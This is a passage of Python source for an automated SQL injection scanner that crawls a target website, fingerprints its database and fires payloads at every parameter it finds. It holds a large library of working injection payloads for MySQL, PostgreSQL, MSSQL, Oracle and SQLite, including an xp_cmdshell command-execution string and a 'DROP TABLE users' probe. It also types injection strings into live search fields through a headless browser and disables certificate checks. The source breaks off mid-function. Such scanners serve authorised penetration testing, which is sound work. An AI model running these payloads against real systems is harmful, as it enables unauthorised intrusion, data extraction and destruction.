"""
Enhanced SQL Injection Scanner with Comprehensive 4-Phase Methodology

This scanner implements a thorough SQL injection testing approach:
Phase 1: Discovery/Crawling - Spider website and find all injection points
Phase 2: Analysis - Fingerprint database and establish baselines
Phase 3: Testing - Execute comprehensive injection techniques
Phase 4: Verification - Confirm vulnerabilities and assess impact

Author: SENTINAL Security Scanner
Version: 2.0
"""

import asyncio
import json
import time
import hashlib
import logging
import re
import statistics
from typing import Dict, List, Any, Optional, Tuple, Set
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, urljoin, urlunparse
from collections import defaultdict
import httpx
from bs4 import BeautifulSoup

# Pyppeteer for SPA support
try:
    from pyppeteer import launch
    PYPPETEER_AVAILABLE = True
except ImportError:
    PYPPETEER_AVAILABLE = False
    logging.warning("Pyppeteer not available. Install with: pip install pyppeteer")

from ..base_module import (
    BaseScannerModule, ScanConfig, ScanResult, Vulnerability, 
    SeverityLevel, ScanType
)

logger = logging.getLogger(__name__)


class InjectionPoint:
    """Represents a potential SQL injection point."""
    
    def __init__(self, url: str, method: str, param_name: str, param_value: str, 
                 param_type: str, context: Dict[str, Any] = None):
        self.url = url
        self.method = method
        self.param_name = param_name
        self.param_value = param_value
        self.param_type = param_type  # 'query', 'post', 'json', 'cookie', 'header'
        self.context = context or {}
        self.tested = False
        self.vulnerable = False
    
    def __hash__(self):
        return hash(f"{self.url}:{self.method}:{self.param_name}:{self.param_type}")
    
    def __eq__(self, other):
        return (self.url == other.url and self.method == other.method and 
                self.param_name == other.param_name and self.param_type == other.param_type)


class SQLInjectionScanner(BaseScannerModule):
    """
    Comprehensive SQL Injection Scanner with 4-Phase Methodology.
    
    Phases:
    1. Discovery/Crawling - Find all entry points (URLs, forms, parameters)
    2. Analysis - Fingerprint database and establish response baselines
    3. Testing - Execute error-based, boolean-based, time-based, union-based tests
    4. Verification - Confirm findings and assess exploitability
    """
    
    # SQL Error Patterns by Database Type (pattern, confidence, db_type)
    SQL_ERRORS = [
        # MySQL
        (r"SQL syntax.*MySQL", 0.95, "MySQL"),
        (r"Warning.*mysql_", 0.90, "MySQL"),
        (r"valid MySQL result", 0.90, "MySQL"),
        (r"MySqlClient\.", 0.90, "MySQL"),
        (r"com\.mysql\.jdbc", 0.95, "MySQL"),
        (r"MySQL Query fail", 0.90, "MySQL"),
        (r"SQL syntax.*MariaDB", 0.95, "MariaDB"),
        
        # PostgreSQL
        (r"PostgreSQL.*ERROR", 0.95, "PostgreSQL"),
        (r"Warning.*\Wpg_", 0.90, "PostgreSQL"),
        (r"valid PostgreSQL result", 0.90, "PostgreSQL"),
        (r"Npgsql\.", 0.90, "PostgreSQL"),
        (r"PG::SyntaxError", 0.95, "PostgreSQL"),
        (r"org\.postgresql\.util\.PSQLException", 0.95, "PostgreSQL"),
        
        # Microsoft SQL Server
        (r"Driver.*SQL[\-\_\ ]*Server", 0.90, "MSSQL"),
        (r"OLE DB.*SQL Server", 0.90, "MSSQL"),
        (r"\[SQL Server\]", 0.90, "MSSQL"),
        (r"Warning.*mssql_", 0.90, "MSSQL"),
        (r"System\.Data\.SqlClient\.SqlException", 0.95, "MSSQL"),
        (r"Microsoft SQL Native Client error", 0.95, "MSSQL"),
        
        # Oracle
        (r"\bORA-[0-9][0-9][0-9][0-9]", 0.95, "Oracle"),
        (r"Oracle error", 0.90, "Oracle"),
        (r"Oracle.*Driver", 0.90, "Oracle"),
        (r"Warning.*\Woci_", 0.90, "Oracle"),
        (r"Warning.*\Wora_", 0.90, "Oracle"),
        
        # SQLite
        (r"SQLite/JDBCDriver", 0.90, "SQLite"),
        (r"SQLite\.Exception", 0.95, "SQLite"),
        (r"System\.Data\.SQLite\.SQLiteException", 0.95, "SQLite"),
        (r"Warning.*sqlite_", 0.90, "SQLite"),
        (r"SQLITE_ERROR", 0.95, "SQLite"),
        (r"sqlite3\.OperationalError", 0.95, "SQLite"),
        
        # Generic SQL Errors
        (r"SQL syntax", 0.70, "Generic"),
        (r"syntax error", 0.60, "Generic"),
        (r"unclosed quotation mark", 0.80, "Generic"),
        (r"quoted string not properly terminated", 0.80, "Generic"),
        (r"SQL command not properly ended", 0.75, "Generic"),
        (r"Incorrect syntax near", 0.75, "Generic"),
    ]
    
    # Comprehensive Payload Library
    PAYLOADS = {
        'error_based': {
            'generic': [
                "'",
                "\"",
                "')",
                "';",
                "' OR '1",
                "' OR 1=1--",
                "\" OR \"1",
                "\" OR 1=1--",
                "') OR ('1",
                "\") OR (\"1",
            ],
            'mysql': [
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
                "' AND UPDATEXML(1,CONCAT(0x7e,DATABASE()),1)--",
                "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                "' AND EXP(~(SELECT * FROM (SELECT VERSION())x))--",
            ],
            'postgresql': [
                "' AND 1=CAST((SELECT version()) AS int)--",
                "' AND 1=CAST((SELECT current_database()) AS int)--",
                "' AND 1=CAST((SELECT current_user) AS int)--",
            ],
            'mssql': [
                "' AND 1=CONVERT(int,@@version)--",
                "' AND 1=CONVERT(int,DB_NAME())--",
                "' AND 1=CONVERT(int,USER_NAME())--",
            ],
            'oracle': [
                "' AND 1=CAST((SELECT banner FROM v$version WHERE ROWNUM=1) AS int)--",
                "' AND 1=CAST((SELECT user FROM dual) AS int)--",
            ],
        },
        'boolean_based': {
            'generic': [
                ("' OR '1'='1", "' OR '1'='2"),  # True/False pair
                ("' OR 1=1--", "' OR 1=2--"),
                ("' AND '1'='1", "' AND '1'='2"),
                ("' AND 1=1--", "' AND 1=2--"),
                ("') OR ('1'='1", "') OR ('1'='2"),
                ("\") OR (\"1\"=\"1", "\") OR (\"1\"=\"2"),
            ],
            'mysql': [
                ("' AND SUBSTRING(VERSION(),1,1)>'0'--", "' AND SUBSTRING(VERSION(),1,1)>'9'--"),
                ("' AND LENGTH(DATABASE())>0--", "' AND LENGTH(DATABASE())>999--"),
                ("' AND ASCII(SUBSTRING(DATABASE(),1,1))>64--", "' AND ASCII(SUBSTRING(DATABASE(),1,1))>200--"),
            ],
            'postgresql': [
                ("' AND SUBSTRING(version(),1,1)>'0'--", "' AND SUBSTRING(version(),1,1)>'z'--"),
                ("' AND LENGTH(current_database())>0--", "' AND LENGTH(current_database())>999--"),
            ],
            'mssql': [
                ("' AND SUBSTRING(@@version,1,1)>'0'--", "' AND SUBSTRING(@@version,1,1)>'z'--"),
                ("' AND LEN(DB_NAME())>0--", "' AND LEN(DB_NAME())>999--"),
            ],
        },
        'time_based': {
            'mysql': [
                ("' AND SLEEP(5)--", 5),
                ("' AND IF(1=1,SLEEP(5),0)--", 5),
                ("' AND (SELECT SLEEP(5))--", 5),
                ("' AND BENCHMARK(5000000,MD5('test'))--", 3),
                ("'; SELECT SLEEP(5)--", 5),
            ],
            'postgresql': [
                ("'; SELECT pg_sleep(5)--", 5),
                ("' AND (SELECT pg_sleep(5))--", 5),
                ("'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--", 5),
            ],
            'mssql': [
                ("'; WAITFOR DELAY '00:00:05'--", 5),
                ("'; IF (1=1) WAITFOR DELAY '00:00:05'--", 5),
                ("' WAITFOR DELAY '00:00:05'--", 5),
            ],
            'oracle': [
                ("' AND DBMS_LOCK.SLEEP(5)--", 5),
                ("'; BEGIN DBMS_LOCK.SLEEP(5); END;--", 5),
            ],
            'sqlite': [
                ("' AND (SELECT COUNT(*) FROM sqlite_master WHERE name LIKE '%' AND RANDOMBLOB(50000000))--", 3),
            ],
        },
        'union_based': {
            'generic': [
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL--",
                "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
                "' UNION ALL SELECT NULL--",
                "' UNION ALL SELECT NULL,NULL--",
                "' UNION ALL SELECT NULL,NULL,NULL--",
            ],
            'mysql': [
                "' UNION SELECT VERSION(),DATABASE(),USER()--",
                "' UNION SELECT NULL,VERSION(),NULL--",
                "' UNION SELECT NULL,DATABASE(),NULL--",
                "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--",
                "' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=DATABASE()--",
            ],
            'postgresql': [
                "' UNION SELECT NULL,version(),NULL--",
                "' UNION SELECT NULL,current_database(),NULL--",
                "' UNION SELECT NULL,current_user,NULL--",
            ],
            'mssql': [
                "' UNION SELECT NULL,@@version,NULL--",
                "' UNION SELECT NULL,DB_NAME(),NULL--",
                "' UNION SELECT NULL,USER_NAME(),NULL--",
            ],
        },
        'stacked_queries': {
            'generic': [
                "'; SELECT 1--",
                "'; SELECT SLEEP(1)--",
            ],
            'mssql': [
                "'; EXEC xp_cmdshell('whoami')--",
                "'; DECLARE @test VARCHAR(8000) SET @test='test'; SELECT @test--",
            ],
        },
    }
    
    # Database Fingerprinting Payloads
    DB_FINGERPRINTS = {
        'MySQL': [
            ("' AND @@version LIKE '%'--", r"mysql|mariadb", 0.90),
            ("' AND CONNECTION_ID()>0--", r"", 0.70),
        ],
        'PostgreSQL': [
            ("' AND version() LIKE '%PostgreSQL%'--", r"postgresql", 0.90),
            ("' AND current_database() LIKE '%'--", r"", 0.70),
        ],
        'MSSQL': [
            ("' AND @@version LIKE '%Microsoft%'--", r"microsoft|sql server", 0.90),
            ("' AND DB_NAME() LIKE '%'--", r"", 0.70),
        ],
        'Oracle': [
            ("' AND (SELECT banner FROM v$version WHERE ROWNUM=1) LIKE '%Oracle%'--", r"oracle", 0.90),
        ],
        'SQLite': [
            ("' AND sqlite_version() LIKE '%'--", r"sqlite", 0.90),
        ],
    }
    
    def __init__(self):
        super().__init__()
        self.name = "SQLInjectionScanner"
        self.description = "Comprehensive SQL injection scanner with 4-phase methodology"
        self.scan_type = ScanType.ACTIVE
        self.client = None
        self.injection_points: Set[InjectionPoint] = set()
        self.baselines: Dict[str, Dict] = {}
        self.detected_db: Optional[str] = None
        self.waf_detected = False
        self.crawled_urls: Set[str] = set()
        self.tested_points: Set[InjectionPoint] = set()
        
    async def scan(self, config: ScanConfig) -> ScanResult:
        """
        Main scan entry point implementing comprehensive 4-phase methodology.
        """
        started_at = datetime.utcnow()
        vulnerabilities = []
        errors = []
        warnings = []
        
        info = {
            'phase_1_discovery': {},
            'phase_2_analysis': {},
            'phase_3_testing': {},
            'phase_4_verification': {},
            'scan_summary': {}
        }
        
        try:
            target_url = config.target
            if not target_url.startswith(('http://', 'https://')):
                target_url = f"https://{target_url}"
            
            self.client = httpx.AsyncClient(
                verify=False,
                timeout=30.0,
                follow_redirects=True,
                headers={
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
            )
            
            logger.info("="*70)
            logger.info("SQL INJECTION SCANNER - 4-PHASE COMPREHENSIVE ANALYSIS")
            logger.info("="*70)
            logger.info(f"Target: {target_url}")
            logger.info(f"Scan Type: {config.scan_type.value}")
            
            # ============================================================
            # PHASE 1: DISCOVERY/CRAWLING
            # ============================================================
            logger.info("\n" + "="*70)
            logger.info("PHASE 1: DISCOVERY & CRAWLING")
            logger.info("="*70)
            logger.info("Objective: Find all injection points (URLs, forms, parameters)")
            
            discovery_result = await self._phase1_discovery(target_url, config)
            info['phase_1_discovery'] = discovery_result
            
            logger.info(f"\n✓ Discovery Complete:")
            logger.info(f"  - URLs Crawled: {discovery_result['urls_crawled']}")
            logger.info(f"  - Injection Points Found: {discovery_result['injection_points_found']}")
            logger.info(f"  - Forms Discovered: {discovery_result['forms_found']}")
            logger.info(f"  - API Endpoints: {discovery_result['api_endpoints_found']}")
            
            if not self.injection_points:
                warnings.append("No injection points discovered. Target may require authentication or has no testable parameters.")
                logger.warning("⚠ No injection points found!")
            
            # ============================================================
            # PHASE 2: ANALYSIS
            # ============================================================
            logger.info("\n" + "="*70)
            logger.info("PHASE 2: ANALYSIS & FINGERPRINTING")
            logger.info("="*70)
            logger.info("Objective: Identify database type and establish baselines")
            
            analysis_result = await self._phase2_analysis(config)
            info['phase_2_analysis'] = analysis_result
            
            logger.info(f"\n✓ Analysis Complete:")
            logger.info(f"  - Database Detected: {analysis_result['database_type'] or 'Unknown'}")
            logger.info(f"  - WAF Detected: {analysis_result['waf_detected']}")
            logger.info(f"  - Baselines Established: {analysis_result['baselines_established']}")
            
            # ============================================================
            # PHASE 3: TESTING
            # ============================================================
            logger.info("\n" + "="*70)
            logger.info("PHASE 3: INJECTION TESTING")
            logger.info("="*70)
            logger.info("Objective: Test all injection techniques systematically")
            
            testing_result = await self._phase3_testing(config)
            vulnerabilities.extend(testing_result['vulnerabilities'])
            info['phase_3_testing'] = testing_result
            
            logger.info(f"\n✓ Testing Complete:")
            logger.info(f"  - Total Tests Executed: {testing_result['total_tests']}")
            logger.info(f"  - Injection Points Tested: {testing_result['points_tested']}")
            logger.info(f"  - Vulnerabilities Found: {len(testing_result['vulnerabilities'])}")
            logger.info(f"  - Techniques Used: {', '.join(testing_result['techniques_used'])}")
            
            # ============================================================
            # PHASE 4: VERIFICATION
            # ============================================================
            logger.info("\n" + "="*70)
            logger.info("PHASE 4: VERIFICATION & IMPACT ASSESSMENT")
            logger.info("="*70)
            logger.info("Objective: Confirm findings and assess exploitability")
            
            if vulnerabilities:
                verification_result = await self._phase4_verification(vulnerabilities, config)
                info['phase_4_verification'] = verification_result
                vulnerabilities = verification_result['verified_vulnerabilities']
                
                logger.info(f"\n✓ Verification Complete:")
                logger.info(f"  - Verified Vulnerabilities: {len(vulnerabilities)}")
                logger.info(f"  - False Positives Filtered: {verification_result['false_positives']}")
            else:
                info['phase_4_verification'] = {'message': 'No vulnerabilities to verify'}
                logger.info("\n✓ No vulnerabilities found to verify")
            
            # ============================================================
            # SCAN SUMMARY
            # ============================================================
            logger.info("\n" + "="*70)
            logger.info("SCAN COMPLETE - SUMMARY")
            logger.info("="*70)
            
            info['scan_summary'] = {
                'total_injection_points': len(self.injection_points),
                'points_tested': len(self.tested_points),
                'vulnerabilities_found': len(vulnerabilities),
                'database_type': self.detected_db,
                'waf_present': self.waf_detected,
                'scan_duration': (datetime.utcnow() - started_at).total_seconds()
            }
            
            if vulnerabilities:
                logger.info(f"⚠ VULNERABILITIES FOUND: {len(vulnerabilities)}")
                severity_counts = {}
                for vuln in vulnerabilities:
                    sev = vuln.severity.value
                    severity_counts[sev] = severity_counts.get(sev, 0) + 1
                
                for severity, count in sorted(severity_counts.items()):
                    logger.info(f"  - {severity.upper()}: {count}")
            else:
                logger.info("✓ No SQL injection vulnerabilities detected")
            
            logger.info(f"\nDatabase: {self.detected_db or 'Unknown'}")
            logger.info(f"WAF: {'Detected' if self.waf_detected else 'Not Detected'}")
            logger.info(f"Duration: {info['scan_summary']['scan_duration']:.2f}s")
            
        except Exception as e:
            error_msg = f"Scan failed: {str(e)}"
            logger.error(error_msg, exc_info=True)
            errors.append(error_msg)
        finally:
            if self.client:
                await self.client.aclose()
        
        return ScanResult(
            module_name=self.name,
            success=len(errors) == 0,
            started_at=started_at,
            completed_at=datetime.utcnow(),
            vulnerabilities=self._deduplicate_vulnerabilities(vulnerabilities),
            errors=errors,
            warnings=warnings,
            info=info
        )
    
    # ================================================================
    # PHASE 1: DISCOVERY/CRAWLING METHODS
    # ================================================================
    
    async def _phase1_discovery(self, url: str, config: ScanConfig) -> Dict[str, Any]:
        """
        Phase 1: Comprehensive Discovery and Crawling
        - Spider the website to find all URLs
        - Identify all entry points (forms, parameters, APIs)
        - Extract testable parameters from all sources
        """
        result = {
            'urls_crawled': 0,
            'injection_points_found': 0,
            'forms_found': 0,
            'api_endpoints_found': 0,
            'discovery_methods': []
        }
        
        # Try browser-based discovery for SPAs
        if PYPPETEER_AVAILABLE and config.scan_type in [ScanType.ACTIVE, ScanType.AGGRESSIVE]:
            try:
                logger.info("→ Attempting browser-based discovery (SPA support)...")
                await self._discover_with_browser(url, config)
                if self.injection_points:
                    result['discovery_methods'].append('browser')
                    logger.info(f"  ✓ Browser discovery successful")
            except Exception as e:
                logger.warning(f"  ✗ Browser discovery failed: {e}")
        
        # Always perform static discovery as well
        logger.info("→ Performing static discovery...")
        await self._discover_static(url, config)
        result['discovery_methods'].append('static')
        
        # Crawl additional pages
        logger.info("→ Crawling website...")
        await self._crawl_website(url, config, max_depth=2)
        
        # Update results
        result['urls_crawled'] = len(self.crawled_urls)
        result['injection_points_found'] = len(self.injection_points)
        
        # Count forms and API endpoints
        for point in self.injection_points:
            if point.param_type == 'post':
                result['forms_found'] += 1
            if '/api/' in point.url or '/rest/' in point.url:
                result['api_endpoints_found'] += 1
        
        return result
    
    async def _discover_with_browser(self, url: str, config: ScanConfig):
        """Use Pyppeteer to discover API endpoints in SPAs."""
        browser = None
        try:
            logger.info("  → Launching headless browser...")
            browser = await launch(
                headless=True,
                args=[
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-gpu'
                ],
                handleSIGINT=False,
                handleSIGTERM=False,
                handleSIGHUP=False
            )
            
            page = await browser.newPage()
            await page.setRequestInterception(True)
            
            captured_requests = []
            
            async def intercept(request):
                """Intercept and capture API requests."""
                req_url = request.url
                method = request.method
                
                # Capture API endpoints
                if any(pattern in req_url.lower() for pattern in [
                    '/api/', '/rest/', '/v1/', '/v2/', '/graphql',
                    '/products', '/users', '/search', '/login', '/data'
                ]):
                    captured_requests.append({
                        'url': req_url,
                        'method': method,
                        'headers': request.headers,
                        'post_data': request.postData
                    })
                    logger.debug(f"  → Captured: {method} {req_url}")
                
                await request.continue_()
            
            page.on('request', lambda req: asyncio.create_task(intercept(req)))
            
            # Navigate to page
            logger.info(f"  → Navigating to {url}...")
            await page.goto(url, {'waitUntil': 'networkidle0', 'timeout': 45000})
            await asyncio.sleep(2)
            
            # Interact with common elements
            await self._interact_with_page(page)
            
            # Process captured requests
            for req in captured_requests:
                await self._extract_injection_points_from_request(
                    req['url'], req['method'], req.get('post_data')
                )
            
            logger.info(f"  ✓ Captured {len(captured_requests)} API requests")
            
        except Exception as e:
            logger.error(f"  ✗ Browser discovery error: {e}")
            raise
        finally:
            if browser:
                await browser.close()
    
    async def _interact_with_page(self, page):
        """Interact with page elements to trigger API calls."""
        try:
            # Try search functionality
            search_selectors = [
                '#searchQuery', '#search', 'input[type="search"]',
                'input[placeholder*="search" i]', '.search-input', '#q'
            ]
            
            for selector in search_selectors:
                try:
                    elem = await page.querySelector(selector)
                    if elem:
                        await elem.type("test' OR 1=1--")
                        await page.keyboard.press('Enter')
                        await asyncio.sleep(1)
                        break
                except:
                    pass
            
            # Click some links
            links = await page.querySelectorAll('a[href]')
            for link in links[:5]:
                try:
                    href = await page.evaluate('(element) => element.href', link)
                    if href and not href.startswith(('javascript:', 'mailto:', '#')):
                        await link.click()
                        await asyncio.sleep(1)
                except:
                    pass
            
            # Try buttons
            buttons = await page.querySelectorAll('button')
            for button in buttons[:3]:
                try:
                    await button.click()
                    await asyncio.sleep(1)
                except:
                    pass
                    
        except Exception as e:
            logger.debug(f"  → Page interaction error: {e}")
    
    async def _discover_static(self, url: str, config: ScanConfig):
        """Static endpoint discovery and parameter extraction."""
        try:
            response = await self.client.get(url)
            self.crawled_urls.add(url)
            
            # Extract parameters from current URL
            await self._extract_injection_points_from_url(url)
            
            # Parse HTML for forms and links
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract forms
            forms = soup.find_all('form')
            for form in forms:
                await self._extract_injection_points_from_form(form, url)
            
            # Find API endpoints in JavaScript
            api_patterns = [
                r'["\']([^"\']*(?:/api|/rest|/v\d|/graphql)/[^"\']*)["\']',
                r'fetch\(["\']([^"\']+)["\']',
                r'axios\.[a-z]+\(["\']([^"\']+)["\']',
                r'\.get\(["\']([^"\']+)["\']',
                r'\.post\(["\']([^"\']+)["\']',
            ]
            
            for pattern in api_patterns:
                matches = re.findall(pattern, response.text, re.IGNORECASE)
                for match in matches:
                    full_url = urljoin(url, match)
                    if urlparse(full_url).netloc == urlparse(url).netloc:
                        await self._extract_injection_points_from_url(full_url)
            
            # Try common API endpoints
            common_endpoints = [
                '/api/search', '/api/products', '/api/users', '/api/data',
                '/rest/search', '/rest/products', '/rest/users',
                '/v1/search', '/v2/search',
                '/search', '/products', '/items'
            ]
            
            for endpoint in common_endpoints:
                test_url = urljoin(url, endpoint)
                try:
                    resp = await self.client.get(test_url, timeout=5)
                    if resp.status_code in [200, 400, 401, 403, 500]:
                        await self._extract_injection_points_from_url(test_url)
                except:
                    pass
                    
        except Exception as e:
            logger.debug(f"Static discovery error: {e}")
    
    async def _crawl_website(self, start_url: str, config: ScanConfig, max_depth: int = 2):
        """Crawl website to find more URLs and injection points."""
        to_crawl = [(start_url, 0)]
        crawled = set()
        
        while to_crawl and len(crawled) < 50:  # Limit crawling
            url, depth = to_crawl.pop(0)
            
            if url in crawled or depth > max_depth:
                continue
            
            try:
                response = await self.client.get(url, timeout=10)
                crawled.add(url)
                self.crawled_urls.add(url)
                
                # Extract injection points from this URL
                await self._extract_injection_points_from_url(url)
                
                # Find more links
                if depth < max_depth:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    for link in soup.find_all('a', href=True):
                        href = link['href']
                        full_url = urljoin(url, href)
                        
                        # Only crawl same domain
                        if urlparse(full_url).netloc == urlparse(start_url).netloc:
                            if full_url not in crawled and not full_url.endswith(('.pdf', '.jpg', '.png', '.gif', '.css', '.js')):
                                to_crawl.append((full_url, depth + 1))
                
            except Exception as e:
                logger.debug(f"Crawl error for {url}: {e}")
                continue
    
    async def _extract_injection_points_from_url(self, url: str):
        """Extract injection points from URL query parameters."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        for param_name, values in params.items():
            param_value = values[0] if values else ''
            point = InjectionPoint(
                url=url,
                method='GET',
                param_name=param_name,
                param_value=param_value,
                param_type='query'
            )
            self.injection_points.add(point)
    
    async def _extract_injection_points_from_form(self, form, base_url: str):
        """Extract injection points from HTML forms."""
        action = form.get('action', '')
        method = form.get('method', 'GET').upper()
        form_url = urljoin(base_url, action) if action else base_url
        
        inputs = form.find_all(['input', 'textarea', 'select'])
        for input_elem in inputs:
            name = input_elem.get('name')
            if name:
                value = input_elem.get('value', '')
                point = InjectionPoint(
                    url=form_url,
                    method=method,
                    param_name=name,
                    param_value=value,
                    param_type='post' if method == 'POST' else 'query'
                )
                self.injection_points.add(point)
    
    async def _extract_injection_points_from_request(self, url: str, method: str, post_data: Optional[str] = None):
        """Extract injection points from captured requests."""
        # Extract from URL parameters
        await self._extract_injection_points_from_url(url)
        
        # Extract from POST data
        if post_data and method in ['POST', 'PUT', 'PATCH']:
            try:
                # Try JSON
                json_data = json.loads(post_data)
                for key, value in json_data.items():
                    if isinstance(value, (str, int, float)):
                        point = InjectionPoint(
                            url=url,
                            method=method,
                            param_name=key,
                            param_value=str(value),
                            param_type='json'
                        )
                        self.injection_points.add(point)
            except:
                # Try form data
                try:
                    form_data = parse_qs(post_data)
                    for param_name, values in form_data.items():
                        param_value = values[0] if values else ''
                        point = InjectionPoint(
                            url=url,
                            method=method,
                            param_name=param_name,
                            param_value=param_value,
                            param_type='post'
                        )
                        self.injection_points.add(point)
                except:
                    pass
    
    # ================================================================
    # PHASE 2: ANALYSIS METHODS
    # ================================================================
    
    async def _phase2_analysis(self, config: ScanConfig) -> Dict[str, Any]:
        """
        Phase 2: Analysis and Fingerprinting
        - Determine database type
        - Establish response baselines
        - Detect WAF/IDS presence
        """
        result = {
            'database_type': None,
            'waf_detected': False,
            'baselines_established': 0,
        }
        
        if not self.injection_points:
            return result
        
        # Fingerprint database
        logger.info("→ Fingerprinting database...")
        db_type = await self._fingerprint_database()
        result['database_type'] = db_type
        self.detected_db = db_type
        if db_type:
            logger.info(f"  ✓ Database identified: {db_type}")
        else:
            logger.info(f"  ℹ Database type unknown")
        
        # Establish baselines
        logger.info("→ Establishing response baselines...")
        baseline_count = 0
        for point in list(self.injection_points)[:10]:  # Limit to first 10
            baseline = await self._establish_baseline(point)
            if baseline:
                point_key = f"{point.method}:{point.url}:{point.param_name}"
                self.baselines[point_key] = baseline
                baseline_count += 1
        
        result['baselines_established'] = baseline_count
        logger.info(f"  ✓ Established {baseline_count} baselines")
        
        # Detect WAF
        logger.info("→ Detecting WAF/IDS...")
        waf_detected = await self._detect_waf()
        result['waf_detected'] = waf_detected
        self.waf_detected = waf_detected
        if waf_detected:
            logger.warning("  ⚠ WAF/IDS detected - may affect testing")
        else:
            logger.info("  ✓ No WAF detected")
        
        return result
    
    async def _fingerprint_database(self) -> Optional[str]:
        """Fingerprint the database type."""
        if not self.injection_points:
            return None
        
        # Test with first few injection points
        test_points = list(self.injection_points)[:3]
        
        for db_type, fingerprints in self.DB_FINGERPRINTS.items():
            for payload, pattern, confidence in fingerprints:
                for point in test_points:
                    try:
                        response = await self._send_payload(point, payload)
                        if response:
                            # Check for database-specific patterns
                            if pattern and re.search(pattern, response.text, re.IGNORECASE):
                                return db_type
                            
                            # Check for database-specific errors
                            for error_pattern, error_conf, error_db in self.SQL_ERRORS:
                                if error_db == db_type and re.search(error_pattern, response.text, re.IGNORECASE):
                                    return db_type
                    except:
                        continue
        
        return None
    
    async def _establish_baseline(self, point: InjectionPoint) -> Optional[Dict[str, Any]]:
        """Establish baseline response for an injection point."""
        try:
            response_times = []
            response_sizes = []
            status_codes = []
            
            # Make 3 requests to establish baseline
            for _ in range(3):
                start_time = time.time()
                response = await self._send_payload(point, point.param_value)
                elapsed = time.time() - start_time
                
                if response:
                    response_times.append(elapsed)
                    response_sizes.append(len(response.text))
                    status_codes.append(response.status_code)
                
                await asyncio.sleep(0.3)
            
            if response_times:
                return {
                    'avg_response_time': statistics.mean(response_times),
                    'avg_response_size': statistics.mean(response_sizes),
                    'typical_status_code': max(set(status_codes), key=status_codes.count),
                    'response_time_stddev': statistics.stdev(response_times) if len(response_times) > 1 else 0
                }
        except Exception as e:
            logger.debug(f"Baseline establishment failed: {e}")
        
        return None
    
    async def _detect_waf(self) -> bool:
        """Detect presence of WAF/IDS."""
        if not self.injection_points:
            return False
        
        waf_test_payloads = [
            "' OR '1'='1",
            "<script>alert(1)</script>",
            "../../etc/passwd",
            "'; DROP TABLE users--"
        ]
        
        test_point = list(self.injection_points)[0]
        
        for payload in waf_test_payloads:
            try:
                response = await self._send_payload(test_point, payload)
                if response:
                    # Check for WAF signatures
                    waf_signatures = [
                        'cloudflare', 'incapsula', 'imperva', 'f5', 'barracuda',
                        'mod_security', 'naxsi', 'blocked', 'forbidden', 'access denied',
                        'security', 'firewall', 'protected'
                    ]
                    
                    response_text = response.text.lower()
                    for sig in waf_signatures:
                        if sig in response_text:
                            return True
                    
                    # Check for suspicious status codes
                    if response.status_code in [403, 406, 419, 429, 501, 503]:
                        return True
            except:
                pass
        
        return False
    
    # ================================================================
    # PHASE 3: TESTING METHODS
    # ================================================================
    
    async def _phase3_testing(self, config: ScanConfig) -> Dict[str, Any]:
        """
        Phase 3: Comprehensive Injection Testing
        - Test error-based injection
        - Test boolean-based blind injection
        - Test time-based blind injection
        - Test union-based injection
        """
        vulnerabilities = []
        total_tests = 0
        techniques_used = set()
        
        if not self.injection_points:
            return {
                'vulnerabilities': [],
                'total_tests': 0,
                'points_tested': 0,
                'techniques_used': []
            }
        
        # Select payloads based on detected database
        payload_sets = self._select_payload_sets()
        
        # Test each injection point
        for point in self.injection_points:
            if point in self.tested_points:
                continue
            
            logger.info(f"→ Testing: {point.method} {point.url} [{point.param_name}]")
            
            # Test each technique
            for technique, payloads in payload_sets.items():
                logger.debug(f"  → Technique: {technique}")
                techniques_used.add(technique)
                
                vulns = await self._test_technique(point, technique, payloads)
                vulnerabilities.extend(vulns)
                total_tests += len(payloads)
                
                # If vulnerability found, move to next point
                if vulns:
                    logger.info(f"  ✓ Vulnerability found: {technique}")
                    break
            
            self.tested_points.add(point)
        
        return {
            'vulnerabilities': vulnerabilities,
            'total_tests': total_tests,
            'points_tested': len(self.tested_points),
            'techniques_used': list(techniques_used)
        }
    
    def _select_payload_sets(self) -> Dict[str, List]:
        """Select appropriate payloads based on detected database."""
        payload_sets = {}
        
        # Always include generic payloads
        for technique in ['error_based', 'boolean_based', 'time_based', 'union_based']:
            if technique in self.PAYLOADS:
                payload_sets[technique] = []
                
                # Add generic payloads
                if 'generic' in self.PAYLOADS[technique]:
                    payload_sets[technique].extend(self.PAYLOADS[technique]['generic'])
                
                # Add database-specific payloads if detected
                if self.detected_db:
                    db_key = self.detected_db.lower()
                    if db_key in self.PAYLOADS[technique]:
                        payload_sets[technique].extend(self.PAYLOADS[technique][db_key])
                else:
                    # If no database detected, add all database-specific payloads
                    for db_payloads in self.PAYLOADS[technique].values():
                        if isinstance(db_payloads, list):
                            payload_sets[technique].extend(db_payloads)
        
        return payload_sets
    
    async def _test_technique(self, point: InjectionPoint, technique: str, payloads: List) -> List[Vulnerability]:
        """Test a specific injection technique on an injection point."""
        vulnerabilities = []
        
        if technique == 'error_based':
            vulns = await self._test_error_based(point, payloads)
            vulnerabilities.extend(vulns)
        
        elif technique == 'boolean_based':
            vulns = await self._test_boolean_based(point, payloads)
            vulnerabilities.extend(vulns)
        
        elif technique == 'time_based':
            vulns = await self._test_time_based(point, payloads)
            vulnerabilities.extend(vulns)
        
        elif technique == 'union_based':
            vulns = await self._test_union_based(point, payloads)
            vulnerabilities.extend(vulns)
        
        return vulnerabilities
    
    async def _test_error_based(self, point: InjectionPoint, payloads: List[str]) -> List[Vulnerability]:
        """Test error-based SQL injection."""
        vulnerabilities = []
        
